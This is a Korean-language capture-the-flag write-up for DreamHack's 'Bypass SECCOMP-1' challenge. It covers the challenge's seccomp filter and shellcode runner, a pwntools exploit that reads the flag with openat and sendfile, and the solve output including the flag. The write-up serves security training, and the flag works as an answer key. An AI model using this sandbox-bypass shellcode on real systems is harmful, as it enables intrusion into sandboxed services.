# [DreamHack] Bypass SECCOMP-1

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Bypass SECCOMP에서 실습하는 문제입니다.
>
> Release: [Bypass SECCOMP-1.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8533666/Bypass.SECCOMP-1.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160778545-efb47ac5-a951-49d3-81ae-3e9e20f2f6b1.png)

## Analysis

```c
void sandbox() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);

  seccomp_load(ctx);
}
```

`sandbox()` 함수에서 seccomp를 설정한다. `open`, `execve`, `execveat`, `write` 시스템 콜은 사용할 수 없다.

```c
int main(int argc, char *argv[]) {
  void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  memset(shellcode, 0, 0x1000);

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sandbox();

  sc = (void *)shellcode;
  sc();
}
```

`shellcode`에 셸코드를 입력받고, 그 셸코드를 실행한다.

## Exploit

`execve`와 `execveat` 시스템 콜을 사용할 수 없으니 ORW를 해야 한다. `open` 대신 `openat`을 사용해서 플래그 파일을 열고, `read`와 `write` 대신 `sendfile` 시스템 콜을 사용해서 파일의 내용을 읽어올 수 있다.

```python
from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./bypass_syscall')
else:
    r = remote('host1.dreamhack.games', 22734)

shellcode = shellcraft.openat(0, '/home/bypass_syscall/flag')
shellcode += shellcraft.sendfile(1, 'rax', 0, 100)
shellcode = asm(shellcode)

r.sendafter('shellcode: ', shellcode)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 22734: Done
[*] Switching to interactive mode
DH{bfd9d65167c7dfabba82e6870bb4a77e}
[*] Got EOF while reading in interactive
$
```